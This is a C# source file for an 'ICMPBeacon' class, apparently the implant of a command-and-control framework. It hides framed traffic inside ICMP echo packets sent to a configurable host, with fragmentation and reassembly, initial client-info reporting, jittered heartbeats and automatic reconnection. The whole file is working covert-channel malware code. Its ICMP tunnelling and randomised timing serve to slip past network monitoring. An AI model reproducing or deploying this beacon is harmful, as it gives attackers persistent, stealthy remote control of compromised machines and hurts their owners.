using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using Beacon.Helper;
using Beacon.MessagePackLib;
using static Beacon.Helper.Helper;

namespace Beacon
{
    /// <summary>
    /// 分片信息
    /// </summary>
    internal class FragmentInfo
    {
        public Dictionary<int, byte[]> Fragments { get; set; } = new Dictionary<int, byte[]>();
        public int TotalFragments { get; set; }
        public DateTime LastUpdate { get; set; } = DateTime.UtcNow;
        
        public bool IsComplete => Fragments.Count == TotalFragments;
        
        public byte[] Reassemble()
        {
            if (!IsComplete) return null;
            
            var totalSize = Fragments.Values.Sum(f => f.Length);
            var result = new byte[totalSize];
            var offset = 0;
            
            for (int i = 0; i < TotalFragments; i++)
            {
                if (Fragments.TryGetValue(i, out var fragment))
                {
                    Buffer.BlockCopy(fragment, 0, result, offset, fragment.Length);
                    offset += fragment.Length;
                }
            }
            
            return result;
        }
    }

    internal class ICMPBeacon
    {
        private string _host;
        private int _port;
        private bool _shouldReconnect = true;
        private bool _isConnected = false;
        private readonly object _reconnectLock = new object();
        private Timer KeepAlive { get; set; }
        private static Timer ReconnectTimer { get; set; }
        private int _sequenceNumber = 0;
        
        // 用于存储接收到的数据
        private byte[] _accumulator = new byte[0];
        
        // 存储分片数据
        private readonly Dictionary<ushort, FragmentInfo> _fragments = new Dictionary<ushort, FragmentInfo>();
        
        public bool Connect(string host, int port)
        {
            Console.WriteLine($"[ICMPBeacon] 尝试连接到 {host}:{port}");
            
            lock (_reconnectLock)
            {
                _host = host;
                _port = port;
                _shouldReconnect = true;
            }

            return TryConnect();
        }

        private bool TryConnect()
        {
            try
            {
                Console.WriteLine($"[ICMPBeacon] 开始连接尝试");
                
                CleanupConnection();
                
                _isConnected = true;

                // 发送初始客户端信息
                Console.WriteLine($"[ICMPBeacon] 发送初始客户端信息");
                var clientInfo = BeaconHandle.BuildClientInfo();
                Console.WriteLine($"[ICMPBeacon] 客户端信息长度: {clientInfo.Length}");
                SendFramed(clientInfo);
                
                // 启动心跳包
                KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null,
                    new Random().Next(10 * 1000, 15 * 1000),
                    new Random().Next(10 * 1000, 15 * 1000));
                
                // 启动接收循环
                var t = new Thread(ReceiveLoop) { IsBackground = true };
                t.Start();
                
                Console.WriteLine($"[ICMPBeacon] 连接建立成功");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] ICMP连接失败: {ex.Message}");
                Console.WriteLine($"[!] 异常详细信息: {ex.StackTrace}");
                _isConnected = false;
                return false;
            }
        }

        private void CleanupConnection()
        {
            try
            {
                KeepAlive?.Dispose();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ICMPBeacon] 清理连接时发生异常: {ex.Message}");
            }
        }

        public void StartReconnectLoop()
        {
            Console.WriteLine($"[ICMPBeacon] 启动重连循环");
            
            ReconnectTimer = new Timer((state) =>
            {
                lock (_reconnectLock)
                {
                    if (!_isConnected && _shouldReconnect)
                    {
                        Console.WriteLine($"[ICMPBeacon] 尝试重连到 {_host}:{_port}");
                        
                        if (TryConnect())
                        {
                            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] ICMP重连成功: {_host}:{_port}");
                        }
                        else
                        {
                            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] ICMP重连失败，5秒后重试: {_host}:{_port}");
                        }
                    }
                }
            }, null, 0, 5000); // 5秒间隔
        }

        public void StopReconnect()
        {
            Console.WriteLine($"[ICMPBeacon] 停止重连");
            
            lock (_reconnectLock)
            {
                _shouldReconnect = false;
                _isConnected = false;
            }
            ReconnectTimer?.Dispose();
            CleanupConnection();
        }

        private void SendFramed(byte[] payload)
        {
            if (!_isConnected) 
            {
                Console.WriteLine($"[ICMPBeacon] 无法发送数据，未连接");
                return;
            }
            
            try
            {
                Console.WriteLine($"[ICMPBeacon] 发送数据，原始长度: {payload.Length}");
                
                // 将长度和数据组合成一个包
                var length = payload.Length;
                var packet = new byte[4 + payload.Length];
                packet[0] = (byte)((length >> 24) & 0xFF);
                packet[1] = (byte)((length >> 16) & 0xFF);
                packet[2] = (byte)((length >> 8) & 0xFF);
                packet[3] = (byte)(length & 0xFF);
                Buffer.BlockCopy(payload, 0, packet, 4, payload.Length);
                
                Console.WriteLine($"[ICMPBeacon] 封装后数据长度: {packet.Length}");
                
                // ICMP数据包大小限制 (减去IP头20字节和ICMP头8字节)
                const int maxIcmpDataSize = 1400; // 保守估计，避免分片
                
                if (packet.Length <= maxIcmpDataSize)
                {
                    // 小数据包，直接发送
                    SendSinglePacket(packet);
                }
                else
                {
                    // 大数据包，需要分片发送
                    Console.WriteLine($"[ICMPBeacon] 数据包过大，需要分片发送");
                    SendFragmentedPacket(packet, maxIcmpDataSize);
                }
            }
            catch (ThreadAbortException)
            {
                Console.WriteLine($"[ICMPBeacon] 发送线程被中止");
                _isConnected = false;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] ICMP发送异常: {ex.Message}");
                Console.WriteLine($"[!] 异常详细信息: {ex.StackTrace}");
                _isConnected = false;
            }
        }
        
        private void SendSinglePacket(byte[] packet)
        {
            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp))
            {
                // 构造ICMP Echo请求包
                var icmpPacket = new byte[8 + packet.Length];
                
                // ICMP头部
                icmpPacket[0] = 8;  // Type: Echo Request
                icmpPacket[1] = 0;  // Code: 0
                icmpPacket[2] = 0;  // Checksum (先设为0)
                icmpPacket[3] = 0;
                icmpPacket[4] = 0;  // ID
                icmpPacket[5] = 0;
                icmpPacket[6] = (byte)(_sequenceNumber >> 8);  // Sequence
                icmpPacket[7] = (byte)(_sequenceNumber & 0xFF);
                
                // 复制数据
                Buffer.BlockCopy(packet, 0, icmpPacket, 8, packet.Length);
                
                // 计算校验和
                var checksum = CalculateChecksum(icmpPacket);
                icmpPacket[2] = (byte)(checksum >> 8);
                icmpPacket[3] = (byte)(checksum & 0xFF);
                
                // 发送到目标地址
                var targetEndPoint = new IPEndPoint(IPAddress.Parse(_host), 0);
                socket.SendTo(icmpPacket, targetEndPoint);
                
                _sequenceNumber++;
                Console.WriteLine($"[ICMPBeacon] 数据发送成功，序列号: {_sequenceNumber - 1}");
            }
        }
        
        private void SendFragmentedPacket(byte[] packet, int maxFragmentSize)
        {
            var totalFragments = (int)Math.Ceiling((double)packet.Length / maxFragmentSize);
            var fragmentId = (ushort)new Random().Next(1, 65535); // 随机分片ID
            
            Console.WriteLine($"[ICMPBeacon] 分片发送，总片数: {totalFragments}，分片ID: {fragmentId}");
            
            for (int i = 0; i < totalFragments; i++)
            {
                var offset = i * maxFragmentSize;
                var fragmentSize = Math.Min(maxFragmentSize, packet.Length - offset);
                
                // 分片标识 + 分片头部：[FRAG:4][FragmentID:2][FragmentIndex:2][TotalFragments:2][FragmentSize:2] + 数据
                var fragmentHeader = new byte[12];
                // 分片标识 "FRAG"
                fragmentHeader[0] = 0x46; // 'F'
                fragmentHeader[1] = 0x52; // 'R'
                fragmentHeader[2] = 0x41; // 'A'
                fragmentHeader[3] = 0x47; // 'G'
                // 分片信息
                fragmentHeader[4] = (byte)(fragmentId >> 8);
                fragmentHeader[5] = (byte)(fragmentId & 0xFF);
                fragmentHeader[6] = (byte)(i >> 8);
                fragmentHeader[7] = (byte)(i & 0xFF);
                fragmentHeader[8] = (byte)(totalFragments >> 8);
                fragmentHeader[9] = (byte)(totalFragments & 0xFF);
                fragmentHeader[10] = (byte)(fragmentSize >> 8);
                fragmentHeader[11] = (byte)(fragmentSize & 0xFF);
                
                var fragmentData = new byte[12 + fragmentSize];
                Buffer.BlockCopy(fragmentHeader, 0, fragmentData, 0, 12);
                Buffer.BlockCopy(packet, offset, fragmentData, 12, fragmentSize);
                
                // 发送分片
                using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp))
                {
                    var icmpPacket = new byte[8 + fragmentData.Length];
                    
                    // ICMP头部 - 使用普通的Echo Request
                    icmpPacket[0] = 8;  // Type: Echo Request
                    icmpPacket[1] = 0;  // Code: 0 (普通数据，分片通过载荷标识识别)
                    icmpPacket[2] = 0;  // Checksum
                    icmpPacket[3] = 0;
                    icmpPacket[4] = 0;  // ID
                    icmpPacket[5] = 0;
                    icmpPacket[6] = (byte)(_sequenceNumber >> 8);
                    icmpPacket[7] = (byte)(_sequenceNumber & 0xFF);
                    
                    Buffer.BlockCopy(fragmentData, 0, icmpPacket, 8, fragmentData.Length);
                    
                    var checksum = CalculateChecksum(icmpPacket);
                    icmpPacket[2] = (byte)(checksum >> 8);
                    icmpPacket[3] = (byte)(checksum & 0xFF);
                    
                    var targetEndPoint = new IPEndPoint(IPAddress.Parse(_host), 0);
                    socket.SendTo(icmpPacket, targetEndPoint);
                    
                    _sequenceNumber++;
                    Console.WriteLine($"[ICMPBeacon] 分片 {i + 1}/{totalFragments} 发送成功，大小: {fragmentSize}");
                }
                
                // 分片间稍微延迟，避免网络拥塞
                try
                {
                    Thread.Sleep(10);
                }
                catch (ThreadInterruptedException)
                {
                    Console.WriteLine($"[ICMPBeacon] 分片发送被中断");
                    break;
                }
            }
        }
        
        /// <summary>
        /// 计算ICMP校验和
        /// </summary>
        /// <param name="data">ICMP数据包</param>
        /// <returns>校验和</returns>
        private ushort CalculateChecksum(byte[] data)
        {
            uint sum = 0;
            
            // 按16位字计算校验和
            for (int i = 0; i < data.Length - 1; i += 2)
            {
                sum += (uint)((data[i] << 8) + data[i + 1]);
            }
            
            // 如果长度为奇数，添加最后一个字节
            if (data.Length % 2 == 1)
            {
                sum += (uint)(data[data.Length - 1] << 8);
            }
            
            // 处理进位
            while ((sum >> 16) != 0)
            {
                sum = (sum & 0xFFFF) + (sum >> 16);
            }
            
            // 取反
            return (ushort)(~sum);
        }

        private void ReceiveLoop()
        {
            try
            {
                Console.WriteLine($"[ICMPBeacon] 启动接收循环");
                
                // 创建原始套接字来接收ICMP数据包
                using (var socket = new System.Net.Sockets.Socket(
                    System.Net.Sockets.AddressFamily.InterNetwork, 
                    System.Net.Sockets.SocketType.Raw, 
                    System.Net.Sockets.ProtocolType.Icmp))
                {
                    // 绑定到本地地址
                    socket.Bind(new System.Net.IPEndPoint(System.Net.IPAddress.Any, 0));
                    
                    var buffer = new byte[4096];
                    
                    while (_isConnected)
                    {
                        try
                        {
                            // 设置接收超时，避免无限等待
                            socket.ReceiveTimeout = 5000; // 5秒超时
                            
                            // 接收ICMP数据包
                            System.Net.EndPoint remoteEndPoint = new System.Net.IPEndPoint(System.Net.IPAddress.Any, 0);
                            var received = socket.ReceiveFrom(buffer, ref remoteEndPoint);
                            
                            if (received > 0 && remoteEndPoint is System.Net.IPEndPoint remoteIp)
                            {
                                // 减少日志输出，提高性能
                                if (received > 100) // 只记录大数据包
                                {
                                    Console.WriteLine($"[ICMPBeacon] 收到ICMP数据包，长度: {received}，来源: {remoteIp.Address}");
                                }
                                
                                // 检查是否来自目标服务器
                                if (remoteIp.Address.ToString() == _host)
                                {
                                    // 在Windows上，原始套接字接收的数据包包含IP头部
                                    if (received < 20) 
                                    {
                                        Console.WriteLine($"[ICMPBeacon] 数据包太短，长度: {received}");
                                        continue;
                                    }

                                    // 解析IP头部长度 (IHL字段在第一个字节的低4位)
                                    int ipHeaderLength = (buffer[0] & 0x0F) * 4;
                                    Console.WriteLine($"[ICMPBeacon] IP头部长度: {ipHeaderLength}");
                                    
                                    if (received < ipHeaderLength + 8) 
                                    {
                                        Console.WriteLine($"[ICMPBeacon] 数据包长度不足以包含ICMP头部");
                                        continue;
                                    }

                                    // ICMP头部从IP头部之后开始
                                    int icmpOffset = ipHeaderLength;
                                    byte type = buffer[icmpOffset];
                                    Console.WriteLine($"[ICMPBeacon] ICMP类型: {type}");
                                    
                                    // 处理Echo回复(0)
                                    if (type == 0)
                                    {
                                        byte code = buffer[icmpOffset + 1];
                                        int dataOffset = icmpOffset + 8;
                                        if (received > dataOffset)
                                        {
                                            var dataLength = received - dataOffset;
                                            var data = new byte[dataLength];
                                            Buffer.BlockCopy(buffer, dataOffset, data, 0, dataLength);
                                            
                                            Console.WriteLine($"[ICMPBeacon] 提取ICMP载荷，长度: {dataLength}");
                                            
                                            // 检查是否为分片数据 (通过载荷开头的"FRAG"标识)
                                            if (dataLength >= 12 && 
                                                data[0] == 0x46 && data[1] == 0x52 && 
                                                data[2] == 0x41 && data[3] == 0x47)
                                            {
                                                Console.WriteLine($"[ICMPBeacon] 检测到分片数据");
                                                ProcessFragmentedData(data);
                                            }
                                            else
                                            {
                                                ProcessReceivedData(data);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        catch (System.Net.Sockets.SocketException ex) when (ex.SocketErrorCode == System.Net.Sockets.SocketError.TimedOut)
                        {
                            // 超时是正常的，继续循环
                            continue;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[!] ICMP接收异常: {ex.Message}");
                            Console.WriteLine($"[!] 异常详细信息: {ex.StackTrace}");
                            _isConnected = false;
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] ICMP接收数据异常: {ex.Message}");
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] 异常详细信息: {ex.StackTrace}");
            }
            finally
            {
                lock (_reconnectLock)
                {
                    _isConnected = false;
                }
                Console.WriteLine($"[ICMPBeacon] 接收循环结束");
            }
        }

        /// <summary>
        /// 处理分片数据
        /// </summary>
        /// <param name="data">分片数据</param>
        private void ProcessFragmentedData(byte[] data)
        {
            try
            {
                if (data.Length < 12)
                {
                    Console.WriteLine($"[ICMPBeacon] 分片头部数据不足");
                    return;
                }
                
                // 跳过"FRAG"标识，解析分片头部
                var fragmentId = (ushort)((data[4] << 8) | data[5]);
                var fragmentIndex = (data[6] << 8) | data[7];
                var totalFragments = (data[8] << 8) | data[9];
                var fragmentSize = (data[10] << 8) | data[11];
                
                Console.WriteLine($"[ICMPBeacon] 分片信息 - ID: {fragmentId}, 索引: {fragmentIndex}/{totalFragments}, 大小: {fragmentSize}");
                
                // 提取分片数据
                var fragmentData = new byte[fragmentSize];
                Buffer.BlockCopy(data, 12, fragmentData, 0, fragmentSize);
                
                // 获取或创建分片信息
                if (!_fragments.TryGetValue(fragmentId, out var fragmentInfo))
                {
                    fragmentInfo = new FragmentInfo { TotalFragments = totalFragments };
                    _fragments[fragmentId] = fragmentInfo;
                }
                
                // 添加分片
                fragmentInfo.Fragments[fragmentIndex] = fragmentData;
                fragmentInfo.LastUpdate = DateTime.UtcNow;
                
                Console.WriteLine($"[ICMPBeacon] 分片已收集，当前进度: {fragmentInfo.Fragments.Count}/{totalFragments}");
                
                // 检查是否收集完整
                if (fragmentInfo.IsComplete)
                {
                    Console.WriteLine($"[ICMPBeacon] 分片收集完成，开始重组");
                    var reassembledData = fragmentInfo.Reassemble();
                    
                    // 清理分片信息
                    _fragments.Remove(fragmentId);
                    
                    // 处理重组后的数据
                    ProcessReceivedData(reassembledData);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ICMPBeacon ERROR] 处理分片数据异常: {ex.Message}");
            }
        }

        // 处理接收到的数据包
        private void ProcessReceivedData(byte[] data)
        {
            Console.WriteLine($"[ICMPBeacon] 处理接收到的数据，长度: {data.Length}");
            
            if (data == null || data.Length == 0) 
            {
                Console.WriteLine($"[ICMPBeacon] 接收到的数据为空");
                return;
            }
            
            // 将新数据追加到累积缓冲
            var combined = new byte[_accumulator.Length + data.Length];
            Buffer.BlockCopy(_accumulator, 0, combined, 0, _accumulator.Length);
            Buffer.BlockCopy(data, 0, combined, _accumulator.Length, data.Length);
            _accumulator = combined;
            
            Console.WriteLine($"[ICMPBeacon] 数据已追加到累积缓冲区，当前长度: {_accumulator.Length}");

            int offset = 0;
            while (true)
            {
                if (_accumulator.Length - offset < 4) 
                {
                    Console.WriteLine($"[ICMPBeacon] 累积缓冲区不足4字节，等待更多数据");
                    break;
                }

                int payloadLength =
                    (_accumulator[offset] << 24) |
                    (_accumulator[offset + 1] << 16) |
                    (_accumulator[offset + 2] << 8) |
                    _accumulator[offset + 3];

                Console.WriteLine($"[ICMPBeacon] 解析载荷长度: {payloadLength}");
                
                if (payloadLength < 0 || payloadLength > 16 * 1024 * 1024)
                {
                    Console.WriteLine($"[ICMPBeacon] 非法载荷长度: {payloadLength}，清空累积缓冲区");
                    _accumulator = new byte[0];
                    _isConnected = false;
                    return;
                }

                if (_accumulator.Length - offset - 4 < payloadLength) 
                {
                    Console.WriteLine($"[ICMPBeacon] 载荷数据不完整，等待更多数据");
                    break;
                }

                var payload = new byte[payloadLength];
                Buffer.BlockCopy(_accumulator, offset + 4, payload, 0, payloadLength);
                
                Console.WriteLine($"[ICMPBeacon] 提取完整载荷，长度: {payload.Length}");
                OnFrame(payload);

                offset += 4 + payloadLength;
            }

            if (offset > 0)
            {
                var remaining = _accumulator.Length - offset;
                var tail = new byte[remaining];
                if (remaining > 0)
                {
                    Buffer.BlockCopy(_accumulator, offset, tail, 0, remaining);
                }
                _accumulator = tail;
                
                Console.WriteLine($"[ICMPBeacon] 更新累积缓冲区，剩余长度: {remaining}");
            }
        }

        public void Error(string ex, string CID) => BeaconHandle.SendError(SendFramed, ex, CID);
        public void Log(string message, string CID) => BeaconHandle.SendLog(SendFramed, message, CID);
        public void KeepAlivePacket(object obj) => BeaconHandle.KeepAlive(SendFramed);

        private void OnFrame(byte[] payload) 
        {
            Console.WriteLine($"[ICMPBeacon] 处理帧数据，长度: {payload.Length}");
            BeaconHandle.OnFrame(SendFramed, payload);
        }

        private void Invoke(BeaconMsgPack unpack_msgpack) => BeaconHandle.Invoke(SendFramed, unpack_msgpack);
    }
}